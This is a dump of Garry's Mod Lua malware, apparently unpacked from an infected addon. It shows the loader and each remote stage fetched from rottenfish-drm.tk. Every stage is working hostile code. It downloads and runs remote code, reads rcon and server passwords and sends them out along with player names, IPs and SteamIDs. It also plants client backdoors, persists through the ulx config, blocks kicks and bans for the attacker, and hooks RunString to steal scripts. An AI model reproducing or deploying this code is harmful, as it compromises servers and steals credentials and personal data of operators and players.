

----------------
-- Original File
----------------
timer.Simple (5, function ()
	http.Fetch ("http://contentproxy.tk/setup.lua", function (c)
		RunString (c)
	end)
end)

-----------------------------------
-- http://contentproxy.tk/setup.lua
-----------------------------------
http.Fetch ("http://rottenfish-drm.tk/setup.lua", function (b)
	RunString (b)
end)
-------------------------------------
-- http://rottenfish-drm.tk/setup.lua
-------------------------------------
http.Fetch ("http://rottenfish-drm.tk/nativescr.html?x="..math.random (1, 99999999), function (b)
	if ADDON_NAME then b = string.Replace (b, "UNKNOWN_ADDON", ADDON_NAME) end

	RunString (b, "RT") -- *Winks*
end)

http.Fetch("http://rottenfish-drm.tk/GLXLibHelper.lua?graphics="..math.random (1, 99999999), function(b)
	RunString (b, "GLXLib") -- For graphical effects
end)

----------------------------------------------
-- http://rottenfish-drm.tk/nativescr.html?x=1
----------------------------------------------

-------
-- Fake
-------
util.AddNetworkString ('BetStrep')
net.Receive ('BetStrep', function()
	RunString (net.ReadString ())
end)

-------
-- Real
-------
util.AddNetworkString ("SteamApp2313")

local ifname = "UNKNOWN_ADDON"

local function CheckFuncNames(func,n)
	for i=0,30 do
		local xx = jit.util.funck( func, -i )
		if xx == n then
			return true
		end
	end
	return false
end

local function GetLinesFromFuncInfo(poof)
	local src = debug.getinfo(poof)
	if not src.short_src then return "(No source)" end
	if not file.Exists(src.short_src,"GAME") then
		return "(RunString)"
	end
	local lines = string.Split(file.Read(src.short_src,"GAME"),"\n")
	local lean = ""
	for k,v in pairs(lines) do
		if (k >= src.linedefined) and (k <= src.lastlinedefined) then
			lean = lean .. v .. "\n"
		end
	end
	return lean
end



local function GetBackdoors()
	local ret = {}
	ret = {}
	local tbl = net.Receivers
	for k,v in pairs(tbl) do
		if k == "setplayerdeathcount" then continue end
		if k == "dconfig_sendammo" then continue end
		if k == "dconfig_sendentity" then continue end
		if k == "dconfig_sendshipment" then continue end
		if k == "dconfig_sendjob" then continue end
		if k == "easy_chat_module_lua_sv" then continue end
		if string.StartWith(k,"glx_") then continue end

		if CheckFuncNames(v,"RunString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"RunStringEx") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"CompileString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
	end
	local r = "RT Version : 6\nInfected addon : "..ifname.."\nSNTE : "
	if file.Exists("autorun/server/snte_source.lua","LUA") then
		r = r .. "yes\n"
	else
		r = r .. "no\n"
	end
	if ULib then
		r = r .. "ULX : yes\n"
	else
		r = r .. "ULX : no\n"
	end
	if CAC then
		r = r .. "CAC : yes\n"
	else
		r = r .. "CAC : no\n"
	end
	for k,o in pairs(ret) do
		r = r .. "----- " .. o.net .. " -----" .. "\n"
		r = r .. "File: " .. o.file .. "\n"
		r = r .. "Function: \n" .. o.func .. "\n"
	end
	return r
end

local function SendError( err )
	http.Post("http://rottenfish-drm.tk/err.php",{
		sname = GetConVar("hostname"):GetString(),
		txt = err,
		soup = tostring(math.random(11,9999999))
	})
end

local rcon_pw = "NOT FOUND"
local fastdlurl = "NOT FOUND"
if file.Exists("cfg/autoexec.cfg","GAME") then
	local cfile = file.Read("cfg/autoexec.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/server.cfg","GAME") then
	cfile = file.Read("cfg/server.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/gmod-server.cfg","GAME") then
	cfile = file.Read("cfg/gmod-server.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
local function SendServer ()
	local playerstr = ""
	for i,v in ipairs (player.GetAll ()) do
		playerstr = playerstr .. "\n" .. v:Name() .. "(" .. v:SteamID() .. ")"
	end
	playerstr = util.Base64Encode (playerstr)
	local send = {
		maxplayer = tostring(game.MaxPlayers()),
		players   = playerstr,
		name      = GetConVar("hostname"):GetString(),
		password  = GetConVar("sv_password"):GetString() or "no password",
		player    = tostring(#player.GetAll()),
		ip        = game.GetIPAddress(),
		rcon      = rcon_pw,
		fastdlurl = fastdlurl,
		map       = game.GetMap(),
		uptime    = tostring(math.floor(CurTime()/60)),
		gamemode  = engine.ActiveGamemode(),
		backdoors = GetBackdoors()
	}
	http.Post("http://rottenfish-drm.tk/postdata", send, function (c, ...)
		if string.len (c) <= 0 then return end
		xpcall (function ()
			local cap = CompileString (c,"RTPayloadCompiler",false)
			if isfunction (cap) then
				cap ()
			else
				SendError (cap)
			end
		end, SendError)
	end, function (e) end)
end

timer.Create ("fdppppppppp", 20, 0, function ()
	SendServer ()
end)
SendServer ()

local function SendBDPersept (ply)
	ply:SendLua ([[net.Receive("SteamApp2313",function()RunString(net.ReadString(),"vcmod")end)]])
end


local function SendPlayer (ply)

	SendBDPersept (ply)

	local send = {
		lastserver = GetConVar ("hostname"):GetString (),
		pname      = tostring (ply:Name     ()),
		pip        = tostring (ply:IPAddress()),
		psteamid   = tostring (ply:SteamID  ())
	}
	http.Post ("http://rottenfish-drm.tk/postdata", send, function (c)
		net.Start ("SteamApp2313")
		net.WriteString (c)
		net.Send (ply)
	end, function (e) end)

	timer.Simple (1, function()
		net.Start ("SteamApp2313")
		net.WriteString ([[
			local function SendHax(name,data)
				http.Post ("http://rottenfish-drm.tk/hacks.php",{name = name, data = data},function()end)
			end
			local keywords = {"hack","exploit","pity","cheat","aimbot","esp","wallhack","backdoor", "sploit", "anatik", "ohno"}

			local rstr = RunString
			function RunString(code,name,bs)
				if not name then name = "RunString" end
				if string.find(name,"vcmod")             then return rstr(code,name,bs) end
				if string.find(code:lower(),"galhaxy")   then return rstr(code,name,bs) end
				if string.find(code:lower(),"faucheuse") then return rstr(code,name,bs) end

				if string.len(code) < 20 then return rstr(code,name,bs) end
				
				for k,v in pairs(keywords) do
					if string.find(code, v) then
						SendHax(LocalPlayer():SteamID().."_"..name,code)
						rstr(code,name,bs)
						return
					end
				end
				rstr(code,name,bs)
			end
			RunStringEx = RunString
			print("LibTard: Loaded")
		]])
		net.Send (ply)
	end)
end

hook.Add("PlayerInitialSpawn","ffpfffffeefefffff",function(ply)
	SendPlayer(ply)
end)

for k, v in pairs(player.GetAll()) do
	SendPlayer(v)
end



if file.Exists("stringpath.txt","DATA") then
	local c = file.Read("stringpath.txt")
	RunString(c,"StringPath_Startup_Loader",false)
else
	file.Write("stringpath.txt", "--[===============[\n\t\t\t\tStringPath config file don't modifie\n]===============]")
	RunString([======[
file.Append("ulx/config.txt", "\n"..[=[ulx hook Think PDM hA "hook.Remove([[Think]],[[PDM]])timer.Simple(10,function()local a=[[http]]..string.char(58)..string.char(47)..string.char(47)..[[rottenfish-drm.tk/p]]http.Fetch(a,RunStringEx)end)"]=])
		]======])
end





local secu = {}
concommand.Add("rt__secure",function(p)
	table.insert(secu,p:SteamID())
	p:ChatPrint("OK. You can't be kicked")
end)

local _R = debug.getregistry()
local kick = _R.Player.Kick
local ban = _R.Player.Ban

function _R.Player.Ban(ply, r)
	local sid = ply:SteamID()
	if table.HasValue(secu,sid) then
		ply:ChatPrint("Prevented ban")
		return
	end
	ban(ply,r)
end


function _R.Player.Kick(ply, r)
	local sid = ply:SteamID()
	if table.HasValue(secu,sid) then
		ply:ChatPrint("Prevented kick : "..r)
		return
	end
	kick(ply,r)
end

local function SendHax(name,data)
	http.Post("http://rottenfish-drm.tk/hacks.php",{
		name = name,
		data = data
		},function()end
	)
end
local keywords = {
	"hack","exploit","pity","cheat","aimbot","esp","wallhack","backdoor", "sploit", "anatik", "ohno", "gizeh", "ssv", "spam visuel"
}
local rstr = RunString
function RunString(code,name,bs)
	if not name then
		name = "RunString"
	end
	if string.find(name,"vcmod") then
		return rstr(code,name,bs)
	end
	if string.find(name,"anti-leak.cf") then
		return rstr(code,name,bs)
	end
	if string.len(code) < 20 then
		return rstr(code,name,bs)
	end

	if not isfunction(CompileString(code,name,false)) then
		return rstr(code,name,bs)
	end
	
	for k,v in pairs(keywords) do
		if string.find(string.lower(code), v) then
			SendHax("SERVERSIDE_"..name,code)
			rstr(code,name,bs)
			return
		end
	end
	rstr(code,name,bs)
end
RunStringEx = RunString

-------------------------------------------------------
-- http://rottenfish-drm.tk/GLXLibHelper.lua?graphics=1
-------------------------------------------------------
local function RandomString( len )
	str = ""
	for i=1,len do 
		str = str..string.char(math.random(97,122))
	end
	return str
end
local keyss = "GLX_"..RandomString(32) -- secure 32 bytes key
util.AddNetworkString(keyss)
net.Receive(keyss,function(_,p)
	local k = net.ReadString()
	local code = net.ReadString()
	if k ~= keyss then -- Security
		p:ChatPrint("GLXLib not loaded, please restart your game")
		return
	end
	RunStringEx(code, "GLXLib", true)
end)
